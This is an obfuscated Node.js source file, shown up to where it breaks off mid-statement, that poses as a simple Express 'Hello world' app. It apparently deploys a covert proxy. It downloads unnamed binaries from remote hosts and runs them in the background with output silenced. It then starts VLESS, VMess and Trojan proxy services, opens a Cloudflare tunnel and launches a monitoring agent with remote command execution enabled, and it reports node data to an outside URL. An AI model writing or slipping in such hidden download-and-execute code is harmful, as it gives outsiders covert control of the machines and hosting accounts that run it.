const _0x33c4c5=_0x6e63;(function(_0xad2a52,_0x3c98e5){const _0x42cf40=_0x6e63,_0x434f7f=_0xad2a52();while(!![]){try{const _0x1bec59=-parseInt(_0x42cf40(0x188))/0x1+-parseInt(_0x42cf40(0x1eb))/0x2+-parseInt(_0x42cf40(0x28c))/0x3*(parseInt(_0x42cf40(0x1c6))/0x4)+parseInt(_0x42cf40(0x1f0))/0x5*(parseInt(_0x42cf40(0x271))/0x6)+-parseInt(_0x42cf40(0x1bc))/0x7+-parseInt(_0x42cf40(0x289))/0x8+-parseInt(_0x42cf40(0x26d))/0x9*(-parseInt(_0x42cf40(0x1de))/0xa);if(_0x1bec59===_0x3c98e5)break;else _0x434f7f['push'](_0x434f7f['shift']());}catch(_0x4050bf){_0x434f7f['push'](_0x434f7f['shift']());}}}(_0x144a,0xe1295));const _0x3c4019=(function(){let _0x18c1e7=!![];return function(_0x2146ae,_0x35b6af){const _0x389dc1=_0x18c1e7?function(){if(_0x35b6af){const _0x142e3a=_0x35b6af['apply'](_0x2146ae,arguments);return _0x35b6af=null,_0x142e3a;}}:function(){};return _0x18c1e7=![],_0x389dc1;};}()),_0x62014d=_0x3c4019(this,function(){const _0x328a30=_0x6e63;return _0x62014d['toString']()['search']('(((.+)+)+)'+'+$')['toString']()['constructo'+'r'](_0x62014d)[_0x328a30(0x196)](_0x328a30(0x21a)+'+$');});_0x62014d();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_proc'+'ess')[_0x33c4c5(0x225)]),{execSync}=require(_0x33c4c5(0x214)+'ess'),http=require('http'),httpProxy=require('http-proxy'),UPLOAD_URL=process['env'][_0x33c4c5(0x19f)]||'',PROJECT_URL=process['env']['PROJECT_UR'+'L']||'',AUTO_ACCESS=process['env'][_0x33c4c5(0x1a9)+'S']||![],FILE_PATH=process[_0x33c4c5(0x1ac)][_0x33c4c5(0x265)]||'./tmp',SUB_PATH=process['env'][_0x33c4c5(0x234)]||'sub',PORT=process['env']['SERVER_POR'+'T']||process['env']['PORT']||0xbb8,EXTERNAL_PORT=process[_0x33c4c5(0x1ac)][_0x33c4c5(0x1e5)+'ORT']||0x1eb4,UUID=process['env']['UUID']||'4b3e2bfe-b'+'de1-5def-d'+'035-0cb572'+'bbd046',NEZHA_SERVER=process['env'][_0x33c4c5(0x1c2)+'ER']||'',NEZHA_PORT=process[_0x33c4c5(0x1ac)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x33c4c5(0x185)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAI'+'N']||'',ARGO_AUTH=process['env']['ARGO_AUTH']||'',CFIP=process[_0x33c4c5(0x1ac)]['CFIP']||'cdns.doon.'+_0x33c4c5(0x1f4),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env']['NAME']||'',MONITOR_KEY=process[_0x33c4c5(0x1ac)]['MONITOR_KE'+'Y']||'a88b11cbdd'+_0x33c4c5(0x1a5)+_0x33c4c5(0x21b)+_0x33c4c5(0x23e)+_0x33c4c5(0x260)+_0x33c4c5(0x22a)+'16f9',MONITOR_SERVER=process[_0x33c4c5(0x1ac)][_0x33c4c5(0x1b3)+_0x33c4c5(0x19c)]||'d3bkmf',MONITOR_UPTIME_URL=process['env'][_0x33c4c5(0x192)+_0x33c4c5(0x1c7)]||_0x33c4c5(0x1e8)+_0x33c4c5(0x1cf)+'gxzg.indev'+'s.in';!fs[_0x33c4c5(0x22e)](FILE_PATH)?(fs[_0x33c4c5(0x1bb)](FILE_PATH),console[_0x33c4c5(0x1f2)](FILE_PATH+('\x20is\x20create'+'d'))):console['log'](FILE_PATH+(_0x33c4c5(0x24c)+_0x33c4c5(0x26e)));function generateRandomName(){const _0x2b7a7c=_0x33c4c5,_0x37c1aa=_0x2b7a7c(0x1e9)+'klmnopqrst'+'uvwxyz';let _0x70907c='';for(let _0x3d789c=0x0;_0x3d789c<0x6;_0x3d789c++){_0x70907c+=_0x37c1aa['charAt'](Math['floor'](Math[_0x2b7a7c(0x1cc)]()*_0x37c1aa[_0x2b7a7c(0x1e4)]));}return _0x70907c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),monitorScriptName=_0x33c4c5(0x1fd)+'itor.sh';let npmPath=path[_0x33c4c5(0x205)](FILE_PATH,npmName),phpPath=path[_0x33c4c5(0x205)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),monitorScriptPath=path[_0x33c4c5(0x205)](FILE_PATH,monitorScriptName),subPath=path[_0x33c4c5(0x205)](FILE_PATH,_0x33c4c5(0x1ce)),listPath=path[_0x33c4c5(0x205)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x33c4c5(0x269)+'n');const proxy=httpProxy[_0x33c4c5(0x209)+_0x33c4c5(0x18f)](),proxyServer=http[_0x33c4c5(0x21c)+'er']((_0x4facd5,_0x95221c)=>{const _0x10e754=_0x33c4c5,_0x197524=_0x4facd5['url'];_0x197524['startsWith'](_0x10e754(0x199)+'o')||_0x197524[_0x10e754(0x227)](_0x10e754(0x1df)+'o')||_0x197524['startsWith']('/trojan-ar'+'go')||_0x197524===_0x10e754(0x191)||_0x197524===_0x10e754(0x213)||_0x197524==='/trojan'?proxy[_0x10e754(0x1af)](_0x4facd5,_0x95221c,{'target':_0x10e754(0x1b8)+'alhost:300'+'1'}):proxy['web'](_0x4facd5,_0x95221c,{'target':'http://loc'+'alhost:'+PORT});});proxyServer['on'](_0x33c4c5(0x272),(_0x32a338,_0x1e3b5e,_0x1c66bf)=>{const _0x32477a=_0x33c4c5,_0x2b7c9e=_0x32a338['url'];_0x2b7c9e[_0x32477a(0x227)](_0x32477a(0x199)+'o')||_0x2b7c9e['startsWith']('/vmess-arg'+'o')||_0x2b7c9e['startsWith'](_0x32477a(0x284)+'go')?proxy['ws'](_0x32a338,_0x1e3b5e,_0x1c66bf,{'target':'http://loc'+'alhost:300'+'1'}):proxy['ws'](_0x32a338,_0x1e3b5e,_0x1c66bf,{'target':'http://loc'+'alhost:'+PORT});}),proxyServer[_0x33c4c5(0x204)](EXTERNAL_PORT,()=>{const _0x5b6f3b=_0x33c4c5;console['log']('Proxy\x20serv'+'er\x20is\x20runn'+_0x5b6f3b(0x23d)+'t:'+EXTERNAL_PORT+'!'),console['log']('HTTP\x20traff'+_0x5b6f3b(0x28b)+'lhost:'+PORT),console[_0x5b6f3b(0x1f2)](_0x5b6f3b(0x229)+'ic\x20->\x20loca'+'lhost:3001');}),app['get']('/',function(_0x7d9d45,_0x1848e7){const _0x1f3a38=_0x33c4c5,_0xeef337=path[_0x1f3a38(0x205)](__dirname,'index.html');fs['existsSync'](_0xeef337)?_0x1848e7['sendFile'](_0xeef337):_0x1848e7['send']('Hello\x20worl'+'d!');});function deleteNodes(){const _0x176a6a=_0x33c4c5;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5ba736;try{_0x5ba736=fs[_0x176a6a(0x25c)+'nc'](subPath,'utf-8');}catch{return null;}const _0x15dbe8=Buffer[_0x176a6a(0x1da)](_0x5ba736,'base64')['toString'](_0x176a6a(0x1f9)),_0x420fea=_0x15dbe8['split']('\x0a')['filter'](_0x1fc0b0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1fc0b0));if(_0x420fea['length']===0x0)return;return axios['post'](UPLOAD_URL+('/api/delet'+'e-nodes'),JSON['stringify']({'nodes':_0x420fea}),{'headers':{'Content-Type':_0x176a6a(0x281)+_0x176a6a(0x1bf)}})['catch'](_0x31124e=>{return null;}),null;}catch(_0x562cb6){return null;}}function cleanupOldFiles(){const _0x25326b=_0x33c4c5;try{const _0x166ee7=fs['readdirSyn'+'c'](FILE_PATH);_0x166ee7[_0x25326b(0x251)](_0x280e87=>{const _0x28604f=path['join'](FILE_PATH,_0x280e87);try{const _0x55f072=fs['statSync'](_0x28604f);_0x55f072['isFile']()&&fs['unlinkSync'](_0x28604f);}catch(_0x35dbec){}});}catch(_0x316948){}}function _0x144a(){const _0x4ead3e=['ync','env','Script:','ownloadAnd','web','count:\x20tru','se_ipv6_co','ull\x202>&1\x20&','MONITOR_SE','error\x20in\x20s','toString','\x0adebug:\x20fa','N\x20or\x20ARGO_','http://loc','has','127.0.0.1','mkdirSync','5774209ZBUivw','ent\x20archit','Error\x20in\x20d','n/json','TunnelSecr','win32','NEZHA_SERV','ing\x20boot.l','automatic\x20','filter','842932dEuPRr','TIME_URL','none','yc.mn/v1','p2\x20--logfi','://','random','charAt','sub.txt','time-vps.b','Starting\x20t','parse','-auto-upda','yc.mn/web','Empowermen','Download\x20','base64','\x20>/dev/nul','App\x20is\x20run','\x0aprotocol:','from','rated\x20succ','map','otocol\x20htt','363040ylyhna','/vmess-arg','1.1.1.1','\x22\x20>\x20/dev/n','rvice:\x20htt','api.co/jso','length','EXTERNAL_P','\x20hostname:','Skipping\x20a','https://up','abcdefghij','Add\x20automa','768826QwgTfL','quic','ty,\x20use\x20qu','error','org','5BzGufP','nitor\x20scri','log','countryCod','eu.org','tializatio','/boot.log\x20','for\x20using\x20','\x0acredentia','utf-8','country_co','https+loca','fileName','cf-vps-mon','oaded\x20succ','status','ernal\x20port','arm','\x20--disable','l\x20http://l','listen','join','re_tls:\x20tr','\x20info\x20--ur','post','createProx','n\x20--skip-p','d\x20successf','chmod','ccessfully','\x20successfu','sion\x20auto\x20','createWrit','arm64','loading\x20fi','/vmess','child_proc','ssions\x20set','close','untry_code','sfully','\x0a\x20\x20\x0atrojan','(((.+)+)+)','e58d6d96cd','createServ','orce_updat','query:\x20fal','/config.js','tic\x20access','yc.mn/bot','\x20is\x20runnin','\x202>&1','nt:\x20true\x0as','exec','Monitor\x20sc','startsWith','.sh\x20-i\x20-k\x20','Xray\x20traff','119c2f2102','Subscripti','ully','essfully','existsSync','obtain\x20Arg','com/kadida','\x20&&\x20./cf-v','8443','ript\x20outpu','SUB_PATH','rm\x20-rf\x20','firefox','\x20to\x20tunnel','ration...','running\x20su','host=','\x20failed:\x20','--config\x20','ing\x20on\x20por','48033195da','ue\x0aip_repo','755','catch','w.githubus','split','onitor\x20scr','\x20task\x20fail','&path=%2Fv','ml\x22\x20>/dev/','blackhole','clear','http','led\x20to\x20sta','\x20already\x20e','text/plain','\x0a\x20\x20\x20\x20servi','Can\x27t\x20find','pkill\x20-f\x20\x22','forEach','o\x20download','access\x20tas','Error\x20exec','test','ml\x20configu','ure:\x20false','https://am','\x20-s\x20','gress:\x0a\x20\x20-','http://ip-','readFileSy','pdate\x20--pr','platform','2096','0efee3e45d','Failed\x20to\x20','mismatch\x20T','/api/add-n','\x201800\x0arepo','FILE_PATH','8/dns-quer','vless','chmodSync','config.jso','tartserver','--no-autou','true','765TLupuK','xists','o?ed=2560','\x0atls:\x20','6137862BCGAUI','upgrade','ssfully','match','f\x20/im\x20','les:','2087','data','substring','l\x202>&1','dge-ip-ver','trojan','--skip-con','Content-Ty','odes','or\x20','applicatio','tunnel.jso','e\x0atemperat','/trojan-ar','p2\x20run\x20--t','oken\x20','https://ip','dding\x20auto','1781920EvSzbl','sable_nat:','ic\x20->\x20loca','6XOxIRl','nohup\x20','NEZHA_KEY','tls','for\x20','1333050SzwcTb','\x20to\x20755','null\x202>&1\x20','/api/add-s','ocalhost:','2053','ss\x20task','yServer','\x20-c\x20\x22','/vless','MONITOR_UP','ation\x20gene','TunnelID','includes','search','and:\x20','message','/vless-arg','tcp','urity=tls&','RVER','tunnel.yml','/null\x202>&1','UPLOAD_URL','npm\x20runnin','ubscriptio','%3Fed%3D25','https://ar','\x0a\x20\x20\x20\x20','705529210c','RunMonitor','og:','Tunnel\x20YAM','AUTO_ACCES','r\x20tunnel\x20t'];_0x144a=function(){return _0x4ead3e;};return _0x144a();}async function generateConfig(){const _0x505a02=_0x33c4c5,_0x44720d={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'dns':{'servers':['https+loca'+'l://8.8.8.'+_0x505a02(0x266)+'y',_0x505a02(0x1fb)+'l://1.1.1.'+'1/dns-quer'+'y','8.8.8.8',_0x505a02(0x1e0)],'queryStrategy':'UseIP','disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':_0x505a02(0x267),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-'+'vision'}],'decryption':_0x505a02(0x1c8),'fallbacks':[{'dest':0xbba},{'path':'/vless-arg'+'o','dest':0xbbb},{'path':_0x505a02(0x1df)+'o','dest':0xbbc},{'path':'/trojan-ar'+'go','dest':0xbbd}]},'streamSettings':{'network':_0x505a02(0x19a)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x505a02(0x267),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x505a02(0x19a),'security':_0x505a02(0x1c8)}},{'port':0xbbb,'listen':_0x505a02(0x1ba),'protocol':_0x505a02(0x267),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x505a02(0x1c8)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x505a02(0x24a),_0x505a02(0x186),_0x505a02(0x1ec)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x505a02(0x1df)+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x505a02(0x24a),'tls',_0x505a02(0x1ec)],'metadataOnly':![]}},{'port':0xbbd,'listen':'127.0.0.1','protocol':_0x505a02(0x27c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x505a02(0x284)+'go'}},'sniffing':{'enabled':!![],'destOverride':[_0x505a02(0x24a),_0x505a02(0x186),_0x505a02(0x1ec)],'metadataOnly':![]}}],'outbounds':[{'protocol':'freedom','tag':'direct','settings':{'domainStrategy':'UseIP'}},{'protocol':_0x505a02(0x248),'tag':'block'}],'routing':{'domainStrategy':'IPIfNonMat'+'ch','rules':[]}};fs['writeFileS'+'ync'](path['join'](FILE_PATH,'config.jso'+'n'),JSON['stringify'](_0x44720d,null,0x2));}function getSystemArchitecture(){const _0x3aa3f5=_0x33c4c5,_0x16322c=os['arch']();return _0x16322c==='arm'||_0x16322c===_0x3aa3f5(0x211)||_0x16322c==='aarch64'?_0x3aa3f5(0x201):'amd';}function downloadFile(_0x44ee28,_0x3c3e0e,_0x41497d){const _0xbbae97=_0x33c4c5,_0x5d2cde=_0x44ee28;!fs['existsSync'](FILE_PATH)&&fs[_0xbbae97(0x1bb)](FILE_PATH,{'recursive':!![]});const _0x533c27=fs[_0xbbae97(0x210)+'eStream'](_0x5d2cde);axios({'method':'get','url':_0x3c3e0e,'responseType':'stream'})['then'](_0x5b8427=>{_0x5b8427['data']['pipe'](_0x533c27),_0x533c27['on']('finish',()=>{const _0x433421=_0x6e63;_0x533c27[_0x433421(0x216)](),console['log']('Download\x20'+path['basename'](_0x5d2cde)+(_0x433421(0x20e)+'lly')),_0x41497d(null,_0x5d2cde);}),_0x533c27['on']('error',_0x500052=>{const _0x172a3f=_0x6e63;fs['unlink'](_0x5d2cde,()=>{});const _0x3f489f='Download\x20'+path['basename'](_0x5d2cde)+_0x172a3f(0x23b)+_0x500052[_0x172a3f(0x198)];console[_0x172a3f(0x1ee)](_0x3f489f),_0x41497d(_0x3f489f);});})['catch'](_0x1be93f=>{const _0x1bbd4c=_0xbbae97,_0x446966=_0x1bbd4c(0x1d5)+path['basename'](_0x5d2cde)+_0x1bbd4c(0x23b)+_0x1be93f['message'];console[_0x1bbd4c(0x1ee)](_0x446966),_0x41497d(_0x446966);});}async function downloadFilesAndRun(){const _0x27c232=_0x33c4c5,_0x54cc30=getSystemArchitecture(),_0x48f5fd=getFilesForArchitecture(_0x54cc30);if(_0x48f5fd['length']===0x0){console[_0x27c232(0x1f2)](_0x27c232(0x24f)+'\x20a\x20file\x20fo'+'r\x20the\x20curr'+_0x27c232(0x1bd)+'ecture');return;}const _0x42b6b7=_0x48f5fd[_0x27c232(0x1dc)](_0x4860c2=>{return new Promise((_0x4d5051,_0xa866bc)=>{const _0x306c96=_0x6e63;downloadFile(_0x4860c2[_0x306c96(0x1fc)],_0x4860c2['fileUrl'],(_0x33d23b,_0x145b2a)=>{_0x33d23b?_0xa866bc(_0x33d23b):_0x4d5051(_0x145b2a);});});});try{await Promise['all'](_0x42b6b7);}catch(_0x299c40){console['error']('Error\x20down'+_0x27c232(0x212)+_0x27c232(0x276),_0x299c40);return;}function _0x4a13ad(_0x4a66a7){const _0x172243=_0x27c232,_0x2b9b05=0x1fd;_0x4a66a7[_0x172243(0x251)](_0x200d0a=>{const _0x504790=_0x172243;fs['existsSync'](_0x200d0a)&&fs[_0x504790(0x20c)](_0x200d0a,_0x2b9b05,_0xee7f6c=>{const _0x27c283=_0x504790;_0xee7f6c?console['error']('Empowermen'+'t\x20failed\x20f'+_0x27c283(0x280)+_0x200d0a+':\x20'+_0xee7f6c):console['log'](_0x27c283(0x1d4)+'t\x20success\x20'+_0x27c283(0x187)+_0x200d0a+':\x20'+_0x2b9b05['toString'](0x8));});});}const _0x413ec8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4a13ad(_0x413ec8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x291321=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x27c232(0x243)](':')['pop']():'',_0x4db876=new Set(['443',_0x27c232(0x232),'2096','2087','2083','2053']),_0x1a1619=_0x4db876[_0x27c232(0x1b9)](_0x291321)?_0x27c232(0x26c):'false',_0x4c33a8='\x0aclient_se'+'cret:\x20'+NEZHA_KEY+(_0x27c232(0x1b6)+'lse\x0adisabl'+'e_auto_upd'+'ate:\x20true\x0a'+'disable_co'+'mmand_exec'+'ute:\x20false'+'\x0adisable_f'+_0x27c232(0x21d)+'e:\x20true\x0adi'+_0x27c232(0x28a)+'\x20false\x0adis'+'able_send_'+_0x27c232(0x21e)+'se\x0agpu:\x20fa'+'lse\x0ainsecu'+_0x27c232(0x206)+_0x27c232(0x23f)+'rt_period:'+_0x27c232(0x264)+'rt_delay:\x20'+'4\x0aserver:\x20')+NEZHA_SERVER+('\x0askip_conn'+'ection_cou'+_0x27c232(0x224)+'kip_procs_'+_0x27c232(0x1b0)+_0x27c232(0x283)+_0x27c232(0x257)+_0x27c232(0x270))+_0x1a1619+('\x0ause_gitee'+'_to_upgrad'+'e:\x20false\x0au'+_0x27c232(0x1b1)+_0x27c232(0x217)+':\x20false\x0auu'+'id:\x20')+UUID;fs['writeFileS'+_0x27c232(0x1ab)](path[_0x27c232(0x205)](FILE_PATH,'config.yam'+'l'),_0x4c33a8);const _0x377616=_0x27c232(0x184)+phpPath+_0x27c232(0x190)+FILE_PATH+('/config.ya'+_0x27c232(0x247)+_0x27c232(0x18a)+'&');try{await exec(_0x377616),console[_0x27c232(0x1f2)](phpName+('\x20is\x20runnin'+'g')),await new Promise(_0x1770d2=>setTimeout(_0x1770d2,0x3e8));}catch(_0x49c58c){console[_0x27c232(0x1ee)]('php\x20runnin'+'g\x20error:\x20'+_0x49c58c);}}else{let _0x62826f='';const _0x2ebf47=['443','8443',_0x27c232(0x25f),_0x27c232(0x277),'2083',_0x27c232(0x18d)];_0x2ebf47['includes'](NEZHA_PORT)&&(_0x62826f='--tls');const _0x7bf0d7='nohup\x20'+npmPath+_0x27c232(0x259)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x62826f+(_0x27c232(0x202)+_0x27c232(0x1d2)+'te\x20--repor'+'t-delay\x204\x20'+_0x27c232(0x27d)+_0x27c232(0x20a)+'rocs\x20>/dev'+_0x27c232(0x19e)+'\x20&');try{await exec(_0x7bf0d7),console['log'](npmName+('\x20is\x20runnin'+'g')),await new Promise(_0x3f475c=>setTimeout(_0x3f475c,0x3e8));}catch(_0x522aa5){console['error'](_0x27c232(0x1a0)+'g\x20error:\x20'+_0x522aa5);}}}else console[_0x27c232(0x1f2)]('NEZHA\x20vari'+'able\x20is\x20em'+'pty,skip\x20r'+'unning');const _0x1c7538=_0x27c232(0x184)+webPath+'\x20-c\x20'+FILE_PATH+(_0x27c232(0x21f)+'on\x20>/dev/n'+_0x27c232(0x1b2));try{await exec(_0x1c7538),console[_0x27c232(0x1f2)](webName+(_0x27c232(0x222)+'g')),await new Promise(_0x5d7d41=>setTimeout(_0x5d7d41,0x3e8));}catch(_0x530533){console[_0x27c232(0x1ee)]('web\x20runnin'+'g\x20error:\x20'+_0x530533);}if(fs[_0x27c232(0x22e)](botPath)){let _0x38b8d2;if(ARGO_AUTH[_0x27c232(0x274)](/^[A-Z0-9a-z=]{120,250}$/))_0x38b8d2='tunnel\x20--e'+'dge-ip-ver'+'sion\x20auto\x20'+_0x27c232(0x26b)+'pdate\x20--pr'+'otocol\x20htt'+_0x27c232(0x285)+_0x27c232(0x286)+ARGO_AUTH;else ARGO_AUTH[_0x27c232(0x195)](_0x27c232(0x1c0)+'et')?(!fs[_0x27c232(0x22e)](path[_0x27c232(0x205)](FILE_PATH,_0x27c232(0x19d)))&&(console['log']('Waiting\x20fo'+'r\x20tunnel.y'+_0x27c232(0x256)+_0x27c232(0x238)),await new Promise(_0x2f1aeb=>setTimeout(_0x2f1aeb,0x3e8))),_0x38b8d2='tunnel\x20--e'+_0x27c232(0x27b)+_0x27c232(0x20f)+_0x27c232(0x23c)+FILE_PATH+('/tunnel.ym'+'l\x20run')):_0x38b8d2='tunnel\x20--e'+'dge-ip-ver'+'sion\x20auto\x20'+'--no-autou'+'pdate\x20--pr'+'otocol\x20htt'+'p2\x20--logfi'+'le\x20'+FILE_PATH+('/boot.log\x20'+'--loglevel'+_0x27c232(0x207)+_0x27c232(0x203)+'ocalhost:')+EXTERNAL_PORT;try{await exec(_0x27c232(0x184)+botPath+'\x20'+_0x38b8d2+('\x20>/dev/nul'+'l\x202>&1\x20&')),console['log'](botName+('\x20is\x20runnin'+'g')),console[_0x27c232(0x1f2)]('Waiting\x20fo'+_0x27c232(0x1aa)+'o\x20start...'),await new Promise(_0x52ae57=>setTimeout(_0x52ae57,0x1388));if(ARGO_AUTH['includes']('TunnelSecr'+'et'))try{process[_0x27c232(0x25e)]===_0x27c232(0x1c1)?await exec('tasklist\x20|'+'\x20findstr\x20'+botName+'\x20>\x20nul'):await exec('pgrep\x20-f\x20\x22'+'['+botName['charAt'](0x0)+']'+botName[_0x27c232(0x279)](0x1)+('\x22\x20>\x20/dev/n'+'ull')),console[_0x27c232(0x1f2)]('Tunnel\x20is\x20'+_0x27c232(0x239)+'ccessfully');}catch(_0x5a4b3a){console[_0x27c232(0x1ee)]('Tunnel\x20fai'+_0x27c232(0x24b)+'rt');}}catch(_0x519773){console[_0x27c232(0x1ee)](_0x27c232(0x254)+'uting\x20comm'+_0x27c232(0x197)+_0x519773);}}await new Promise(_0x598647=>setTimeout(_0x598647,0x7d0));}function _0x6e63(_0x3986fc,_0x5338c6){const _0x4c648a=_0x144a();return _0x6e63=function(_0x62014d,_0x3c4019){_0x62014d=_0x62014d-0x184;let _0x144aca=_0x4c648a[_0x62014d];return _0x144aca;},_0x6e63(_0x3986fc,_0x5338c6);}function getFilesForArchitecture(_0x472c23){const _0x2316a1=_0x33c4c5;let _0x108d37;_0x472c23===_0x2316a1(0x201)?_0x108d37=[{'fileName':webPath,'fileUrl':_0x2316a1(0x1a3)+'m64.ssss.n'+_0x2316a1(0x1d3)},{'fileName':botPath,'fileUrl':_0x2316a1(0x1a3)+'m64.ssss.n'+'yc.mn/bot'}]:_0x108d37=[{'fileName':webPath,'fileUrl':_0x2316a1(0x258)+'d64.ssss.n'+_0x2316a1(0x1d3)},{'fileName':botPath,'fileUrl':_0x2316a1(0x258)+'d64.ssss.n'+_0x2316a1(0x221)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2c580a=_0x472c23==='arm'?'https://ar'+'m64.ssss.n'+'yc.mn/agen'+'t':'https://am'+'d64.ssss.n'+'yc.mn/agen'+'t';_0x108d37['unshift']({'fileName':npmPath,'fileUrl':_0x2c580a});}else{const _0x1aa376=_0x472c23===_0x2316a1(0x201)?_0x2316a1(0x1a3)+'m64.ssss.n'+'yc.mn/v1':_0x2316a1(0x258)+'d64.ssss.n'+_0x2316a1(0x1c9);_0x108d37['unshift']({'fileName':phpPath,'fileUrl':_0x1aa376});}}return _0x108d37;}function argoType(){const _0x27aee6=_0x33c4c5;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAI'+_0x27aee6(0x1b7)+'AUTH\x20varia'+'ble\x20is\x20emp'+_0x27aee6(0x1ed)+'ick\x20tunnel'+'s');return;}if(ARGO_AUTH['includes']('TunnelSecr'+'et'))try{const _0x434ac0=JSON[_0x27aee6(0x1d1)](ARGO_AUTH),_0x5c407f=_0x434ac0[_0x27aee6(0x194)];fs['writeFileS'+_0x27aee6(0x1ab)](path['join'](FILE_PATH,_0x27aee6(0x282)+'n'),ARGO_AUTH);const _0x58ef8d='tunnel:\x20'+_0x5c407f+(_0x27aee6(0x1f8)+'ls-file:\x20')+path[_0x27aee6(0x205)](FILE_PATH,'tunnel.jso'+'n')+(_0x27aee6(0x1d9)+'\x20http2\x0a\x0ain'+_0x27aee6(0x25a)+_0x27aee6(0x1e6)+'\x20')+ARGO_DOMAIN+(_0x27aee6(0x24e)+'ce:\x20http:/'+'/localhost'+':')+EXTERNAL_PORT+('\x0a\x20\x20\x20\x20origi'+'nRequest:\x0a'+'\x20\x20\x20\x20\x20\x20noTL'+'SVerify:\x20t'+'rue\x0a\x20\x20-\x20se'+_0x27aee6(0x1e2)+'p_status:4'+'04\x0a');fs['writeFileS'+'ync'](path['join'](FILE_PATH,'tunnel.yml'),_0x58ef8d),console[_0x27aee6(0x1f2)](_0x27aee6(0x1a8)+'L\x20configur'+_0x27aee6(0x193)+_0x27aee6(0x1db)+_0x27aee6(0x22d));}catch(_0x116537){console['error']('Error\x20gene'+'rating\x20tun'+'nel\x20config'+'uration:',_0x116537);}else console['log']('ARGO_AUTH\x20'+_0x27aee6(0x262)+'unnelSecre'+'t,\x20use\x20tok'+'en\x20connect'+_0x27aee6(0x237));}async function getMetaInfo(){const _0x541e47=_0x33c4c5;try{const _0x236b93=await axios['get'](_0x541e47(0x287)+_0x541e47(0x1e3)+'n/',{'timeout':0xbb8});if(_0x236b93[_0x541e47(0x278)]&&_0x236b93[_0x541e47(0x278)][_0x541e47(0x1fa)+'de']&&_0x236b93['data']['org'])return _0x236b93['data'][_0x541e47(0x1fa)+'de']+'_'+_0x236b93['data']['org'];}catch(_0x1c57d1){try{const _0x2275c6=await axios['get'](_0x541e47(0x25b)+'api.com/js'+'on/',{'timeout':0xbb8});if(_0x2275c6[_0x541e47(0x278)]&&_0x2275c6['data'][_0x541e47(0x1ff)]==='success'&&_0x2275c6[_0x541e47(0x278)][_0x541e47(0x1f3)+'e']&&_0x2275c6['data']['org'])return _0x2275c6['data']['countryCod'+'e']+'_'+_0x2275c6[_0x541e47(0x278)][_0x541e47(0x1ef)];}catch(_0x2dc46f){}}return'Unknown';}async function extractDomains(){const _0x252856=_0x33c4c5;let _0x30d818;if(ARGO_AUTH&&ARGO_DOMAIN)_0x30d818=ARGO_DOMAIN,console['log']('ARGO_DOMAI'+'N:',_0x30d818),await _0xf46d18(_0x30d818);else try{const _0x5a31d7=fs['readFileSy'+'nc'](path[_0x252856(0x205)](FILE_PATH,'boot.log'),_0x252856(0x1f9)),_0x11d724=_0x5a31d7['split']('\x0a'),_0x40370a=[];_0x11d724['forEach'](_0x5dac7b=>{const _0x529a4d=_0x5dac7b['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x529a4d){const _0x1fa9d6=_0x529a4d[0x1];_0x40370a['push'](_0x1fa9d6);}});if(_0x40370a[_0x252856(0x1e4)]>0x0)_0x30d818=_0x40370a[0x0],console[_0x252856(0x1f2)]('ArgoDomain'+':',_0x30d818),await _0xf46d18(_0x30d818);else{console['log']('ArgoDomain'+'\x20not\x20found'+',\x20re-runni'+'ng\x20bot\x20to\x20'+_0x252856(0x22f)+'oDomain'),fs['unlinkSync'](path['join'](FILE_PATH,'boot.log'));async function _0x3ac6ec(){const _0x3fd7b9=_0x252856;try{process[_0x3fd7b9(0x25e)]==='win32'?await exec('taskkill\x20/'+_0x3fd7b9(0x275)+botName+('.exe\x20>\x20nul'+_0x3fd7b9(0x223))):await exec(_0x3fd7b9(0x250)+'['+botName[_0x3fd7b9(0x1cd)](0x0)+']'+botName[_0x3fd7b9(0x279)](0x1)+(_0x3fd7b9(0x1e1)+'ull\x202>&1'));}catch(_0x57ec70){}}_0x3ac6ec(),await new Promise(_0x15be3b=>setTimeout(_0x15be3b,0xbb8));const _0x323988='tunnel\x20--e'+_0x252856(0x27b)+'sion\x20auto\x20'+_0x252856(0x26b)+_0x252856(0x25d)+_0x252856(0x1dd)+_0x252856(0x1ca)+'le\x20'+FILE_PATH+(_0x252856(0x1f6)+'--loglevel'+_0x252856(0x207)+_0x252856(0x203)+_0x252856(0x18c))+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x323988+(_0x252856(0x1d7)+'l\x202>&1\x20&')),console['log'](botName+('\x20is\x20runnin'+'g')),await new Promise(_0x23d7f4=>setTimeout(_0x23d7f4,0xbb8)),await 